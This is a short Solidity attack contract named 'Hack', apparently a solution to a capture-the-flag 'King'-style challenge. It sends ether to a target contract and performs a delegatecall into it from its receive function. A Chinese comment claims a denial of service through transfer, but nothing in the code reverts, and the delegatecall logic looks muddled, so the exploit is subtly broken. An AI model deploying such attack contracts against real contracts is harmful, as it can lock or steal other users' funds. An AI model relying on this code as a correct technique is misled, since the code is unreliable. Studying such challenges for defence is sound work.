pragma solidity 0.8.0;

contract Hack{
    address public king;
    uint256 public prize;
    address public owner;
    address public target;
    bool public hacked=false;
    constructor(address add) payable{
        owner = target = add;
        king = address(this);
    }

    function hack() public payable {
        target.call{value:1000000000000000}("");
    }

    receive() external payable {
        if (hacked==false && msg.sender == target) 
        {
            target.delegatecall("");
            hacked=true;
        }
    }

}

// 利用transfer造成拒绝服务攻击